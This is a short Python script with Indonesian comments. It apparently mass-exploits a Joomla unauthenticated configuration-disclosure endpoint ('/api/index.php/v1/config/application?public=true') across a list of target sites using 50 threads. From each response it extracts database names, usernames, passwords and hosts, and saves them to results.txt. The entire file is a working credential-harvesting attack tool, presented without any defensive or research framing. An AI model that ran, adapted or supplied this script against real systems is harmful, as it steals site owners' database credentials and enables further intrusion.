import re
import requests
from multiprocessing.dummy import Pool as ThreadPool

# timeout untuk HTTP request
TIMEOUT = 5

# membaca URL dari file list.txt
with open("list.txt", "r") as file:
    urls = file.read().splitlines()

def process_url(url):
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "http://" + url
    url += "/api/index.php/v1/config/application?public=true" # menambahkan path diakhir setiap URL
    try:
        # membuat HTTP request ke URL
        response = requests.get(url, timeout=TIMEOUT)
        data = response.text

        # menggunakan regex untuk mencari nilai data
        db = re.search(r'"db":"([^"]+)"', data)
        user = re.search(r'"user":"([^"]+)"', data)
        password = re.search(r'"password":"([^"]+)"', data)
        host = re.search(r'"host":"([^"]+)"', data)

        # memeriksa apakah nilai data ditemukan atau tidak
        if db and user and password and host:
            # memformat output sesuai dengan yang diminta
            output = f"{url}|{db.group(1)}|{user.group(1)}|{password.group(1)}|{host.group(1)}"

            # menampilkan hasil di terminal
            print(f"Found: {output}")

            # menyimpan hasilnya ke dalam file results.txt
            with open("results.txt", "a") as file:
                file.write(output + "\n")
        else:
            # menampilkan pesan jika nilai data tidak ditemukan
            print(f"Not Found: {url}")
    except Exception as e:
        # menampilkan pesan jika terjadi kesalahan saat HTTP request
        print(f"Error: {url} ")

# menggunakan threading untuk melakukan HTTP request secara paralel
with ThreadPool(50) as pool:
    pool.map(process_url, urls)

# menggunakan multiprocessing untuk memproses data secara paralel
with open("results.txt", "r") as file:
    urls_data = file.read().splitlines()

def process_data(data):
    url, db, user, password, host = data.split("|")
    # memformat output sesuai dengan yang diminta
    output = f"{url}|{db}|{user}|{password}|{host}"
    return output

with ThreadPool(50) as pool:
    results = pool.map(process_data, urls_data)

with open("results.txt", "w") as file:
    file.write("\n".join(results))

print("done Check Your Results.txt") # menampilkan pesan jika proses sudah selesai
